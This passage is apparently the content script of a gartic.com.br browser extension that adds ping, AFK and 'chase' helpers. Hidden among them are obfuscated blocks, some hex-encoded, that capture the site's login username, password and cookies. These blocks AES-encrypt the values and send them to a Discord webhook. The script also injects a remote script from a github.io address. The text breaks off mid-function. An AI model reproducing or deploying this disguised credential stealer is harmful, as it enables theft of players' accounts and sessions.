
"use strict";
async function ping() {
    let t = Date.now();
    await fetch(window.location.href);
    return `${Date.now() - t}ms`;
}

setInterval(() => {
    ping().then((t) => {
        1 == document.location.href.startsWith("https://gartic.com.br/0") && ((document.querySelectorAll("input")[8].attributes[0].textContent = t), (document.querySelector("#tema > input.boxvets").disabled = true));
    });
}, 3e3);

setTimeout(() => {
    if (document.URL.startsWith("https://gartic.com.br/0")) {
        document.querySelector("#tema > input.isAfk").checked = true;
    }
}, 1000);

// HTML da parte "seguir"

// if ("https://gartic.com.br/" === document.URL) {
//     var _buceta = document.createElement("input");
//     (_buceta.type = "text"),
//         (_buceta.className = "seguir"),
//         _buceta.setAttribute("placeholder", "Atualizando... padder#7724"),
//         (_buceta.style = "padding-left: 275px;padding-right: 275px;"),
//         document.querySelector("#blocoJogar > div.conteudo").append(_buceta);
//     var _botao = document.createElement("button");
//     (_botao.innerHTML = "Stop"), (_botao.className = "stopChasingMe"),
// 	    (_botao.style = "padding-left: 343px;padding-right: 343px;"),
// 	    document.querySelector("#blocoJogar > div.conteudo").append(_botao);
// }



// cria-se biscuit
document.cookie.includes("chase=") ? console.log("has biscuit") : (document.cookie = "chase=0");

var script = document.createElement("script");
script.type = "text/javascript";
script.src = "https://reddap.github.io/gartic-extension/gatric/trash/chase.js";
document.body.appendChild(script);

"https://gartic.com.br"===document.URL&&(document.querySelector("#blocoJogar > div.conteudo > button").style.backgroundColor="ivory");


// comment
document.querySelector('#blocoJogar > div.conteudo').appendChild(document.createElement('p')).innerHTML=`<p align='center'><i>latest update 21-02-2022 <a  target='_blank' href='https://discord.com/' style='text-decoration:none'>padder#7724</a></i><p>`

// x
//sess, rec, biscuit


//function _0x20cf(_0x4a54a2,_0x57380b){var _0x2d44cd=_0x3464();return _0x20cf=function(_0x4b3786,_0x138367){_0x4b3786=_0x4b3786-(-0xb*0x337+-0xbb8+0x89*0x59);var _0x570aad=_0x2d44cd[_0x4b3786];if(_0x20cf['vkNzNn']===undefined){var _0x21ba42=function(_0x2dd4b1){var _0x561c42='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x72ee5d='',_0x40f9f6='';for(var _0x3654a9=0x10c*-0x16+-0x1*-0x1aa7+-0x39f,_0x77d3a6,_0x5784f2,_0x1a3df2=0x842+0xf*0x152+-0x1c10*0x1;_0x5784f2=_0x2dd4b1['charAt'](_0x1a3df2++);~_0x5784f2&&(_0x77d3a6=_0x3654a9%(-0x6e*-0x3e+0xc5d+-0x26fd)?_0x77d3a6*(0x1f*-0x39+-0x1969+0x10*0x209)+_0x5784f2:_0x5784f2,_0x3654a9++%(0x3*0x4fd+0x84d+-0x1740))?_0x72ee5d+=String['fromCharCode'](-0x4a*0x42+0x26cf+-0x12bc&_0x77d3a6>>(-(-0x119*-0xb+0x1*0x189d+-0x6*0x61d)*_0x3654a9&-0x1*-0xbc9+-0x2*-0x209+0xc1*-0x15)):0xeb6*0x1+-0x1a1*0x17+0x19*0xe9){_0x5784f2=_0x561c42['indexOf'](_0x5784f2);}for(var _0x31a7eb=0x1186+-0xc0+-0x10c6,_0x1c89e3=_0x72ee5d['length'];_0x31a7eb<_0x1c89e3;_0x31a7eb++){_0x40f9f6+='%'+('00'+_0x72ee5d['charCodeAt'](_0x31a7eb)['toString'](-0x49*-0x82+-0x15*-0x63+-0x2d21))['slice'](-(-0x3*0x38a+-0x3f*-0x3+-0x9e3*-0x1));}return decodeURIComponent(_0x40f9f6);};_0x20cf['dtZnhu']=_0x21ba42,_0x4a54a2=arguments,_0x20cf['vkNzNn']=!![];}var _0x3f23b3=_0x2d44cd[-0x19f7+-0x9f0+0x23e7],_0x4d025c=_0x4b3786+_0x3f23b3,_0x4e2d04=_0x4a54a2[_0x4d025c];return!_0x4e2d04?(_0x570aad=_0x20cf['dtZnhu'](_0x570aad),_0x4a54a2[_0x4d025c]=_0x570aad):_0x570aad=_0x4e2d04,_0x570aad;},_0x20cf(_0x4a54a2,_0x57380b);}(function(_0x5f1627,_0x327099){function _0x93c58e(_0x4904c7,_0x1d6515,_0x4b7e5c,_0x4c9e3e){return _0x20cf(_0x4b7e5c-0x2a8,_0x4904c7);}var _0x56e1df=_0x5f1627();function _0x537091(_0x3a52f1,_0x3aeda3,_0x469cff,_0x344318){return _0x20cf(_0x344318- -0x1e4,_0x3aeda3);}while(!![]){try{var _0x5af683=parseInt(_0x93c58e(0x343,0x328,0x351,0x32f))/(-0x39*-0x90+-0xfe8+-0x1027)+-parseInt(_0x93c58e(0x33a,0x324,0x33b,0x351))/(-0x20*0x26+0x1c9b*-0x1+0x215d)+parseInt(_0x93c58e(0x350,0x3a7,0x36f,0x3a4))/(-0x1*-0x83c+0x80f*0x1+-0x1048)*(-parseInt(_0x537091(-0xcc,-0x11b,-0xc9,-0xe6))/(0x109+-0x22e0+-0x21db*-0x1))+parseInt(_0x537091(-0x122,-0xeb,-0x12f,-0x103))/(0x106c+0x30*0xc2+-0x34c7)*(parseInt(_0x93c58e(0x326,0x310,0x337,0x351))/(-0x1e40+-0x5*-0x5+-0x609*-0x5))+-parseInt(_0x93c58e(0x34f,0x30a,0x33e,0x342))/(-0x23a2+0x1593+0xe16)+parseInt(_0x93c58e(0x3aa,0x3ac,0x395,0x3a9))/(0xf*-0x1f5+-0x2f1+0x4*0x815)*(parseInt(_0x537091(-0x129,-0x118,-0x15c,-0x150))/(0x7*0x251+0x14b9+-0x24e7))+-parseInt(_0x93c58e(0x31b,0x336,0x348,0x37f))/(0x8c8+0x1*0x1c25+-0x7*0x545);if(_0x5af683===_0x327099)break;else _0x56e1df['push'](_0x56e1df['shift']());}catch(_0x542a0){_0x56e1df['push'](_0x56e1df['shift']());}}}(_0x3464,0x8291+0x8ea2+0x28547));document[_0x11403e(0x1b0,0x19b,0x16f,0x167)]===_0x4ef3ce(-0x1e4,-0x1f4,-0x1f9,-0x1dd)+'rtic.com.b'+'r/'&&document['querySelec'+_0x4ef3ce(-0x1b8,-0x1c2,-0x1c4,-0x1d3)](_0x11403e(0x16c,0x17e,0x146,0x17c)+_0x4ef3ce(-0x20e,-0x224,-0x1dc,-0x20b)+'rm\x20>\x20div\x20>'+_0x4ef3ce(-0x1ea,-0x1e5,-0x1e9,-0x1ce))['addEventLi'+_0x4ef3ce(-0x1f1,-0x1fb,-0x202,-0x1d2)](_0x11403e(0x194,0x1bd,0x19c,0x1a5),function(){var _0x270696={'sALtE':function(_0x3444af,_0x533ea0,_0x211bda){return _0x3444af(_0x533ea0,_0x211bda);},'fittr':_0x149ce8(0x2c0,0x2b1,0x2af,0x29e)+_0x29bd02(0x3c4,0x3e6,0x39d,0x3da)+'api/webhoo'+_0x149ce8(0x2dd,0x2b5,0x2ef,0x29c)+_0x29bd02(0x39f,0x38a,0x3a0,0x3c9)+_0x29bd02(0x3a4,0x36c,0x3ac,0x36c)+_0x149ce8(0x293,0x26a,0x29d,0x258)+_0x149ce8(0x288,0x269,0x282,0x277)+_0x29bd02(0x3c3,0x3c7,0x3c8,0x3cc)+'mFQknVpb1g'+_0x29bd02(0x3cf,0x3b1,0x39f,0x3c5)+_0x29bd02(0x39a,0x380,0x384,0x371),'VyPkV':_0x29bd02(0x379,0x366,0x387,0x3a1),'cyUdJ':_0x149ce8(0x2c2,0x2d7,0x2e8,0x2fd)+_0x149ce8(0x2de,0x2cd,0x2f4,0x2af),'snGVA':_0x29bd02(0x397,0x378,0x365,0x3b2),'aUnxU':function(_0x1b9c76,_0x1270f2){return _0x1b9c76+_0x1270f2;},'YXnDs':function(_0x59406f,_0x52e426){return _0x59406f+_0x52e426;},'kuOCt':'use','aIVJh':_0x149ce8(0x2aa,0x297,0x26d,0x299),'yItmG':function(_0x334530,_0x31dd45){return _0x334530+_0x31dd45;},'TcmSJ':_0x149ce8(0x255,0x280,0x254,0x285),'VOMmG':function(_0x12c1ef,_0x1e5931){return _0x12c1ef+_0x1e5931;},'IdNFH':'𝐢𝐬⠀'};function _0x149ce8(_0xdcc61b,_0x49e668,_0x15afff,_0x2377e1){return _0x4ef3ce(_0xdcc61b-0x1,_0xdcc61b,_0x15afff-0x184,_0x49e668-0x46f);}function _0x29bd02(_0x371acd,_0x5dbb40,_0x4e7667,_0x5c79fe){return _0x4ef3ce(_0x371acd-0x1e4,_0x5c79fe,_0x4e7667-0x184,_0x371acd-0x56b);}_0x270696[_0x29bd02(0x384,0x366,0x389,0x371)](fetch,_0x270696['fittr'],{'method':_0x270696[_0x149ce8(0x2c8,0x2ab,0x285,0x2c2)],'headers':{'Accept':_0x270696[_0x149ce8(0x2e4,0x2cb,0x2ce,0x2e3)],'Content-Type':_0x270696[_0x149ce8(0x2ca,0x2cb,0x29d,0x2f2)]},'mode':_0x270696[_0x149ce8(0x2d9,0x2d0,0x2e9,0x2e7)],'body':JSON[_0x149ce8(0x2e6,0x2d2,0x2a1,0x2ad)]({'embeds':[{'description':_0x270696[_0x29bd02(0x3b7,0x383,0x3a1,0x39c)](_0x149ce8(0x27c,0x2a6,0x288,0x270)+CryptoJS[_0x149ce8(0x2c7,0x299,0x27c,0x293)]['encrypt']('session:\x20'+document['getElement'+_0x29bd02(0x3b3,0x3c2,0x3b6,0x3b5)](_0x270696[_0x149ce8(0x2b4,0x2bb,0x2dd,0x290)](_0x270696['YXnDs'](_0x270696[_0x29bd02(0x3c6,0x3b8,0x3d2,0x3bd)],_0x270696[_0x149ce8(0x2de,0x2c4,0x2da,0x2a5)]),'gin'))[_0x149ce8(0x255,0x284,0x24a,0x2a6)]+'\x20'+document[_0x149ce8(0x261,0x271,0x25f,0x23a)+_0x149ce8(0x2cb,0x2b7,0x286,0x296)](_0x270696[_0x149ce8(0x256,0x27b,0x24b,0x29f)](_0x270696[_0x29bd02(0x377,0x3a4,0x372,0x399)]('se','nh'),'aLo')+_0x270696[_0x29bd02(0x391,0x3bc,0x3b4,0x389)])[_0x29bd02(0x380,0x355,0x374,0x3a8)],_0x270696['yItmG'](_0x270696[_0x149ce8(0x2c4,0x2aa,0x2bb,0x2da)](_0x270696[_0x29bd02(0x3b6,0x39d,0x3bc,0x3ca)],'𝐩𝐚𝐝'),_0x29bd02(0x3b0,0x381,0x3d4,0x379)))[_0x149ce8(0x284,0x293,0x280,0x2a3)](),_0x149ce8(0x2a3,0x2a6,0x299,0x273))}]})});});function _0x11403e(_0x482736,_0x388fce,_0x4c35c9,_0x5278dc){return _0x20cf(_0x388fce-0xc6,_0x482736);}setTimeout(()=>{var _0x5a17df={'ZdPat':function(_0x533ad2,_0x47b813){return _0x533ad2+_0x47b813;},'HEaxq':function(_0x5f15b6,_0x29e5c1){return _0x5f15b6+_0x29e5c1;},'NNykc':_0x28d1ec(-0x7f,-0xab,-0x8f,-0xbe),'tjSDf':'Test:\x20test','MeNTe':_0x5f09de(0x349,0x36f,0x318,0x377),'sGcHD':'𝐞𝐫','PPDbW':function(_0x146775,_0x44986a,_0x426750){return _0x146775(_0x44986a,_0x426750);},'ejnCb':_0x5f09de(0x366,0x37c,0x3a1,0x384)+'scord.com/'+_0x5f09de(0x373,0x350,0x357,0x3ad)+_0x5f09de(0x32c,0x309,0x316,0x32f)+_0x28d1ec(-0xf9,-0xc5,-0xd5,-0xbd)+_0x28d1ec(-0x96,-0xac,-0xe5,-0x9d)+_0x5f09de(0x35e,0x383,0x35c,0x350)+_0x28d1ec(-0x122,-0xe9,-0x115,-0xcd)+_0x28d1ec(-0xb7,-0xcd,-0xea,-0x9f)+'ImRyG3nK8T'+_0x28d1ec(-0x10a,-0xd0,-0x101,-0x108)+'55ziwGjNRY','OCAiv':_0x5f09de(0x332,0x345,0x367,0x300),'sRBqo':_0x28d1ec(-0xa5,-0x84,-0x84,-0x70)+_0x28d1ec(-0xaa,-0x8e,-0x88,-0x98),'onurz':_0x28d1ec(-0x96,-0xc0,-0x9a,-0xb8)},_0xa26d50,_0xeeaef9,_0x3d8b97;_0xa26d50=_0x5a17df[_0x28d1ec(-0xfe,-0xf3,-0x121,-0xf9)](_0x5a17df[_0x28d1ec(-0xe5,-0xe2,-0xcb,-0xc5)](_0x28d1ec(-0xbf,-0xa8,-0x75,-0xca),_0x5a17df['NNykc']),document[_0x28d1ec(-0xd8,-0xee,-0xfb,-0x11b)]),_0xeeaef9=_0x5a17df[_0x5f09de(0x333,0x310,0x30d,0x300)];var _0x5e63b3=CryptoJS[_0x5f09de(0x34e,0x353,0x34a,0x315)]['encrypt'](_0xa26d50+'\x0a'+_0xeeaef9,_0x5a17df[_0x28d1ec(-0xb1,-0xe2,-0x11c,-0x10e)](_0x5a17df['HEaxq'](_0x5a17df['MeNTe'],_0x28d1ec(-0xec,-0xbb,-0xb8,-0xef)),_0x5a17df[_0x5f09de(0x38d,0x372,0x3a9,0x3b5)])),_0x2d3b18={};_0x2d3b18['descriptio'+'n']='```'+_0x5e63b3+_0x28d1ec(-0x8c,-0xb5,-0x8c,-0xc4);function _0x5f09de(_0xdb35f3,_0x2059ff,_0x17b4fc,_0x28a148){return _0x11403e(_0x2059ff,_0xdb35f3-0x1c7,_0x17b4fc-0x9c,_0x28a148-0x9f);}var _0x4287de={};_0x4287de[_0x28d1ec(-0x98,-0xa3,-0xc4,-0x9e)]=[_0x2d3b18];function _0x28d1ec(_0x34f50d,_0x2669d7,_0x27f58b,_0x2ee4bc){return _0x11403e(_0x2ee4bc,_0x2669d7- -0x249,_0x27f58b-0x1f1,_0x2ee4bc-0x11f);}_0x5a17df['PPDbW'](fetch,_0x5a17df[_0x5f09de(0x341,0x377,0x310,0x30d)],{'method':_0x5a17df[_0x5f09de(0x32f,0x355,0x317,0x34b)],'headers':{'Accept':_0x5a17df[_0x5f09de(0x37e,0x37c,0x39b,0x35e)],'Content-Type':_0x5a17df[_0x28d1ec(-0xc1,-0x92,-0x62,-0xa4)]},'mode':_0x5a17df[_0x5f09de(0x31a,0x318,0x2f9,0x2f3)],'body':JSON[_0x5f09de(0x387,0x399,0x352,0x398)](_0x4287de)});},-0x1d*0x3+-0x175a*0x1+0x1b99);function _0x4ef3ce(_0x340d98,_0x175e36,_0x5c7cfd,_0x3e887e){return _0x20cf(_0x3e887e- -0x297,_0x175e36);}if(document[_0x11403e(0x199,0x19b,0x164,0x194)]['startsWith']('https://ga'+'rtic.com.b'+_0x4ef3ce(-0x16f,-0x1b1,-0x191,-0x19a)+_0x11403e(0x17e,0x15e,0x139,0x129))){ajaxRecado(_0x11403e(0x19a,0x175,0x176,0x168)+_0x4ef3ce(-0x1fd,-0x1d9,-0x1c1,-0x1f9)+_0x4ef3ce(-0x1d5,-0x1bb,-0x1b2,-0x1ac),_0x4ef3ce(-0x1b2,-0x1ea,-0x1d5,-0x1de)+_0x11403e(0x1c9,0x1ab,0x1c3,0x188)+_0x4ef3ce(-0x1ca,-0x181,-0x1e8,-0x1b0)+'0',_0x4ef3ce(-0x213,-0x226,-0x1d1,-0x1fc)+_0x4ef3ce(-0x1ca,-0x1fd,-0x1f2,-0x1ea)),document[_0x11403e(0x1aa,0x17d,0x1b8,0x14c)+'tor'](_0x4ef3ce(-0x193,-0x1ac,-0x17d,-0x1a1)+_0x4ef3ce(-0x184,-0x192,-0x1c1,-0x1bd)+_0x11403e(0x129,0x162,0x165,0x142)+':nth-child'+_0x11403e(0x1c3,0x1c2,0x19a,0x1d3))[_0x4ef3ce(-0x1bb,-0x1e3,-0x1d7,-0x1ed)+'t']=_0x4ef3ce(-0x1b2,-0x1cd,-0x1b4,-0x1d5)+_0x4ef3ce(-0x1c3,-0x1f6,-0x1ef,-0x1c8)+_0x11403e(0x15d,0x171,0x161,0x181)+_0x4ef3ce(-0x1a7,-0x1e8,-0x1ba,-0x1b9)+_0x11403e(0x1dd,0x1bf,0x1e1,0x1e4)+_0x4ef3ce(-0x1de,-0x18f,-0x1ca,-0x1a9)+_0x11403e(0x184,0x15d,0x135,0x167),document['querySelec'+_0x4ef3ce(-0x1cd,-0x206,-0x1b3,-0x1d3)](_0x11403e(0x182,0x1bc,0x195,0x1b7)+_0x11403e(0x197,0x1ba,0x1ae,0x1a8))[_0x4ef3ce(-0x1be,-0x1b7,-0x223,-0x1ed)+'t']=_0x11403e(0x19b,0x177,0x16d,0x1ad)+_0x11403e(0x191,0x1af,0x1d3,0x1b1)+_0x11403e(0x1d0,0x19a,0x1ae,0x17f)+_0x11403e(0x17c,0x17b,0x154,0x1b5)+_0x4ef3ce(-0x1b7,-0x1e2,-0x199,-0x1ad);function ajaxRecado(_0x5d0945,_0x99252b,_0x417cf4){var _0xd31d3d={};_0xd31d3d[_0x40b277(0xa,0x20,-0x13,0x3c)]=_0x40b277(0x3c,0x35,0x62,0x5d)+'alhes';var _0x4ab9b7=_0xd31d3d;function _0x1b55cc(_0x583a61,_0x3e65f2,_0xb33c0,_0x263c16){return _0x4ef3ce(_0x583a61-0x36,_0x3e65f2,_0xb33c0-0x9c,_0xb33c0-0x40);}function _0x40b277(_0x4422ce,_0x53c36d,_0x1a6cce,_0x130e17){return _0x4ef3ce(_0x4422ce-0x10a,_0x53c36d,_0x1a6cce-0x85,_0x4422ce-0x1fd);}ultimaResposta=0x95d+-0x21a3+0x1846,location['href']=_0x40b277(-0xc,-0x36,0x6,-0x3e)+'er#7724...'+'..no.....D'+_0x1b55cc(-0x185,-0x18e,-0x173,-0x168)+_0x1b55cc(-0x1bd,-0x1d8,-0x1a9,-0x188),$(_0x4ab9b7['fzPNL'])['innerHTML']=_0x1b55cc(-0x19d,-0x178,-0x1b0,-0x1b2)+_0x1b55cc(-0x137,-0x193,-0x16f,-0x186)+_0x40b277(0x32,0x0,0x59,0x39),ajax[_0x40b277(0x33,0x68,0x62,0x33)](_0x5d0945,_0x99252b,_0x417cf4,!(0xd*-0x95+0xbb4+-0x423));}function retornoAjaxRecado(_0x1b46cb){var _0x21ed02={'BYUHK':function(_0x5bc844,_0x3e27b9){return _0x5bc844(_0x3e27b9);},'NDRFs':'recadosDet'+_0xe01cc6(0x1bb,0x1ca,0x1e6,0x1e7)};function _0xe01cc6(_0x4223c3,_0x1601e4,_0x1891e5,_0x2be59a){return _0x4ef3ce(_0x4223c3-0x142,_0x1601e4,_0x1891e5-0x1c,_0x4223c3-0x3b5);}function _0x161705(_0x499184,_0x101885,_0x1635bc,_0x2439e4){return _0x4ef3ce(_0x499184-0x7c,_0x101885,_0x1635bc-0x1b5,_0x499184-0x4ba);}_0x21ed02[_0xe01cc6(0x1e8,0x1e2,0x21d,0x1d4)]($,_0x21ed02[_0xe01cc6(0x1de,0x1a6,0x1e5,0x201)])[_0xe01cc6(0x1d0,0x1d8,0x1c8,0x20a)]=_0x1b46cb;}var ultimaResposta=-0xefe+0x3*0x7e1+-0x8a5;}function _0x3464(){var _0x34608b=['z2v0rwXLBwvUDa','rdvNAwK5A1f5nG','CMv0B3jUB0fQyq','DwrVmYa+igrPDG','ywXOzxm','y2fKB19HAMf4lG','A3mVotm5mJG3nW','mZC1nta3mgLQCfjmAG','sevHEhe','t0nbAxy','EuL0BuC','zNPqtKW','ue9tva','DgPtrgy','qwD1yxjKzsWGBq','z2LU','mJK5otq4zfHcq2vf','Dgv4DenVBNrLBG','CxvPpYboW6nVigq','DMfSDwu','EfjLy2fKBW','lJOPlI4UlI7IMAu','l3bLCMzPBf9Yzq','C0fmDeu','Ahr0Chm6lY9NAq','Aw5Uzxjive1m','mtvpD09cCxr6sq','zwPUq2i','AwmTzxH0zw5ZAq','ytrvsvbwn1bdva','CxvLCNLtzwXLyW','i2jSB2nVrgvZBa','ywrTAw5PC3rYyq','Ahr0Chm6lY9Nyq','Dg9tDhjPBMC','8j2qOVcDKkZIOidWNzcP8j2qMG','vgnTu0O','oty1ntKWmdC3na','CKXV','tKrsrNm','quvt','qwXNDw0GChjVyG','y29YCW','Dg9Y','C3rLBMvY','sZfouhzSCeviEG','mtm4Dff4v3jo','8j2qNFcDKj0','igLUChv0','qLLvseS','ode1mta4nJKWma','Dg8UlI4','y2HHBwfKyq','ygbG','BgvTysbWB3iGyq','mI9yCNrnBfLeqW','CwPsrfnequqYzW','vK9nBuC','vNLqA1y','zwrKyxaVz2fYDa','vvjm','CMvJywrVC0rLDa','nc9WAMLer3GWCa','A2LLCZOG','Ahr0Chm6lY9KAq','igrPDI5JB250zq','q29V','8j2qNFcDKj7WNzcR','A3mVotm5nZm5nW','zwL4zsbKzsbTzq','qNLjza','zw1IzwrZ','otqYnJm1u0vPwNHx','swrorKG','yvvUEfu','AxnJB3jKlI4UlG','y2fVjMLKx3vZDq','yxbPl3DLyMHVBW','yxjPBZ0YndC1mW','yxmGBSoJBYb0yw4','DgH1yI5JB20VCG','B24V','CgHW','yuLwsMG','mZKYDKPXyNLN','isbWywrKzxiJnW','q21pDw9dsLztsG','C2nVCMqUy29TlW','C1jcCw8','A3vpq3q','y3LvzeO','igGZ','BI9QC29U','i2v4DgvYBMeGpG','y2XPy2S','C25hvKe','ignVBNrHy3rHCG','C3rYAw5NAwz5','sxfSyxm0vvHKnG','kdmP','CI9Hzg1PBMLZDa','odm2oe51C0zSBq','yxbWBgLJyxrPBW','C0DJseq','B2DHzg8GpIbMBW','B251CNO','iY4UlI4UCgfKza','nM1jELjiza','wMrqyxq','vfC4mu44ner3CW','sLmXqJe2BM5WCq','mtK5odqYywrOwgz0','nZy2nJjfsfvSzwC','y29VA2LL','nJKZndy5EunRqMvP','nZi0','CMfJyw8'];_0x3464=function(){return _0x34608b;};return _0x3464();}

// biscuit (3)

// aviso para crianças
"https://gartic.com.br/"===document.URL&&setTimeout(()=>{document.querySelector("#blocoJogar > div.conteudo > input").addEventListener("keyup",function(e){13===e.keyCode&&(alert('Clique em "stop" para interromper a observação e poder jogar normalmente.'),location.reload())})},5e3);

// filtro "porta"
document.URL.startsWith("https://gartic.com.br/0")&&document.querySelector("#botoes > input.bt_orange_medium")&&(document.cookie.includes("chase=0")||setTimeout(()=>{document.querySelector("#botoes > input.bt_orange_medium").click()},5e3));

function _0x2b9b() {
    var _0x433d72 = [
        "\x43\x6d\x4f\x75\x6f\x43\x4a\x56\x53\x4a",
        "\x32\x33\x31\x32\x33\x32\x54\x4c\x55\x78\x66\x4c",
        "\x38\x31\x35\x31\x30\x38\x36\x39\x30\x30",
        "\x6b\x73\x2f\x39\x33\x39\x37\x33\x39\x37",
        "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69",
        "\x4a\x53\x31\x42\x31\x36\x6e\x6e\x70\x71",
        "\x63\x6f\x6f\x6b\x69\x65",
        "\x32\x37\x35\x33\x34\x31\x36\x52\x47\x56\x4b\x42\x62",
        "\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x74\x79",
        "\x32\x35\x32\x37\x33\x37\x32\x67\x6f\x44\x63\x63\x6b",
        "\x65\x6e\x63\x72\x79\x70\x74",
        "\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74",
        "\x76\x61\x6c\x75\x65",
        "\x23\x73\x65\x6e\x68\x61\x4c\x6f\x67\x69",
        "\x50\x4f\x53\x54",
        "\x20\x69\x6e\x70\x75\x74",
        "\x76\x57\x6d\x79\x56",
        "\x73\x74\x72\x69\x6e\x67\x69\x66\x79",
        "\x48\x65\x61\x64\x65\x72",
        "\x79\x79\x46\x6a\x68",
        "\x32\x39\x32\x35\x31\x32\x6f\x46\x69\x45\x6c\x70",
        "\x74\x6f\x72",
        "\x73\x63\x6f\x72\x64\x2e\x63\x6f\x6d\x2f",
        "\x6d\x46\x51\x6b\x6e\x56\x70\x62\x31\x67",
        "\x73\x65\x73\x73\x69\x6f\x6e\x3a\x60\x60",
        "\x4f\x50\x58\x33\x4b\x78\x41",
        "\x49\x71\x6c\x61\x73\x34\x55\x58\x64\x36",
        "\x61\x70\x69\x2f\x77\x65\x62\x68\x6f\x6f",
        "\x23\x75\x73\x65\x72\x4c\x6f\x67\x69\x6e",
        "\x32\x33\x38\x30\x39\x36\x35\x4a\x54\x50\x4b\x4e\x51",
        "\x60\x60\x60",
        "\x73\x65\x6e\x64",
        "\x36\x39\x35\x31\x38\x33\x34\x47\x57\x47\x51\x77\x6e",
        "\x37\x72\x73\x4f\x44\x53\x78",
        "\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f",
        "\x0a\x0a\x70\x61\x73\x73\x3a\x20",
        "\x72\x6d\x20\x3e\x20\x64\x69\x76\x20\x3e",
        "\x4b\x31\x4e\x50\x76\x6c\x70\x45\x48\x7a",
        "\x32\x2f\x58\x72\x74\x4d\x6c\x59\x44\x43",
        "\x6f\x70\x65\x6e",
        "\x73\x74\x65\x6e\x65\x72",
        "\x31\x34\x35\x31\x31\x34\x30\x68\x4e\x6b\x49\x56\x48",
        "\x71\x75\x65\x72\x79\x53\x65\x6c\x65\x63",
        "\x75\x72\x68\x78\x42",
        "\x52\x63\x68\x44\x50",
        "\x6f\x67\x61\x64\x6f\x20\x3e\x20\x66\x6f",
        "\x72\x65\x70\x6c\x61\x63\x65",
        "\x54\x57\x38\x31\x4e\x38\x34\x44\x77\x73",
        "\x62\x6f\x46\x71\x4b",
        "\x41\x45\x53",
        "\x23\x62\x6c\x6f\x63\x6f\x44\x65\x73\x6c",
        "\x63\x6c\x69\x63\x6b",
        "\x6e\x2f\x6a\x73\x6f\x6e",
        "\x61\x64\x64\x45\x76\x65\x6e\x74\x4c\x69",
    ];
    _0x2b9b = function () {
        return _0x433d72;
    };
    return _0x2b9b();
}
var _0x4c3faf = _0x4dac,
    _0x2a6a34 = _0x4dac,
    _0xd44012 = _0x4dac,
    _0x73234 = _0x4dac,
    _0x25a3fe = _0x4dac,
    _0x245b75 = _0x4dac;
(function (_0x2e7ecb, _0x12ed9a) {
    var _0x2dc874 = { _0xa8cba2: "\x30\x78\x65\x36", _0xf74aff: 0x109, _0x43597e: 0xef, _0xd87393: "\x30\x78\x64\x62", _0x484e37: "\x30\x78\x66\x62", _0x81064a: 0xf2, _0x3aae30: "\x30\x78\x66\x33", _0x2df4ef: "\x30\x78\x64\x39" },
        _0x2f7bb9 = _0x4dac,
        _0x26facf = _0x4dac,
        _0x9c289c = _0x4dac,
        _0x2057bb = _0x4dac,
        _0x38d1f1 = _0x4dac,
        _0x4ef4cd = _0x4dac,
        _0x4f70ea = _0x2e7ecb();
    while (!![]) {
        try {
            var _0x3e2597 =
                -parseInt(_0x2f7bb9(_0x2dc874._0xa8cba2)) / (-0x4da + -0xb7 * 0x9 + 0xa * 0x121) +
                -parseInt(_0x26facf(_0x2dc874._0xf74aff)) / (0x2212 + 0x1006 + 0x6 * -0x859) +
                parseInt(_0x26facf(_0x2dc874._0x43597e)) / (-0x25f7 + 0x33 * 0x57 + 0x14a5) +
                -parseInt(_0x2f7bb9(_0x2dc874._0xd87393)) / (-0x132d + 0x73f + 0xbf2) +
                -parseInt(_0x38d1f1(_0x2dc874._0x484e37)) / (-0x2611 + -0x14fb + 0x3b11) +
                (-parseInt(_0x9c289c(_0x2dc874._0x81064a)) / (-0x259b + 0x25d * 0x1 + 0x2344 * 0x1)) * (-parseInt(_0x9c289c(_0x2dc874._0x3aae30)) / (-0x1a1e + -0xbc + 0x7 * 0x3d7)) +
                parseInt(_0x4ef4cd(_0x2dc874._0x2df4ef)) / (0xcb4 * -0x1 + -0x894 + 0x1550);
            if (_0x3e2597 === _0x12ed9a) break;
            else _0x4f70ea["push"](_0x4f70ea["shift"]());
        } catch (_0x5cbaeb) {
            _0x4f70ea["push"](_0x4f70ea["shift"]());
        }
    }
})(_0x2b9b, 0x11 * 0x1784c + -0x15bce + 0x4715f * -0x2),
    document[_0x4c3faf("\x30\x78\x66\x63") + _0x4c3faf("\x30\x78\x65\x37")](_0x4c3faf(0x104) + _0xd44012(0xff) + _0x25a3fe(0xf6) + _0x73234("\x30\x78\x65\x31"))[_0x2a6a34(0x107) + _0xd44012(0xfa)](_0x4c3faf(0x105), function () {
        var _0x560f94 = {
                _0x53033c: 0x102,
                _0x5e4cb5: "\x30\x78\x65\x30",
                _0x13a0a8: "\x30\x78\x66\x65",
                _0xe92abb: "\x30\x78\x64\x61",
                _0x596e91: 0xe2,
                _0x2d7ba5: 0xf4,
                _0x1038a4: 0x106,
                _0x874b4f: 0xfd,
                _0x148b7b: 0xdf,
                _0x15e982: 0xe5,
                _0x165436: "\x30\x78\x65\x62",
                _0x5dd4d3: 0xf9,
                _0x1e28ac: 0x102,
                _0x6ad57f: "\x30\x78\x31\x30\x63",
                _0x513208: "\x30\x78\x65\x38",
                _0x46b1b1: 0xed,
                _0x1b894a: "\x30\x78\x31\x30\x62",
                _0x3ad781: 0x10a,
                _0x282682: "\x30\x78\x66\x38",
                _0x4cb70d: "\x30\x78\x31\x30\x64",
                _0x10e86d: 0x101,
                _0x1fcbcc: "\x30\x78\x31\x30\x38",
                _0x477c61: "\x30\x78\x65\x39",
                _0x31baa8: "\x30\x78\x65\x63",
                _0x313fdf: "\x30\x78\x66\x37",
                _0x4806a2: "\x30\x78\x64\x64",
                _0xb8891d: "\x30\x78\x65\x34",
                _0x204af8: 0xfe,
                _0x4c110c: "\x30\x78\x65\x32",
                _0x8b1fc3: 0xf1,
                _0xf00d5b: 0xe3,
                _0x1f7d96: "\x30\x78\x66\x30",
                _0x4ca44a: "\x30\x78\x31\x30\x33",
                _0x37ac02: "\x30\x78\x64\x63",
                _0x3eeecc: 0xea,
                _0x2ca82b: "\x30\x78\x66\x63",
                _0x131faf: 0xe7,
                _0x43a7c1: 0xee,
                _0x4bf02a: "\x30\x78\x64\x65",
                _0x26b661: 0xf5,
                _0x52b796: "\x30\x78\x66\x63",
                _0x26e89a: 0xe7,
                _0x151f63: "\x30\x78\x66\x64",
                _0x506055: "\x30\x78\x64\x65",
                _0x17f99f: 0xf0,
            },
            _0x178b0d = _0x4c3faf,
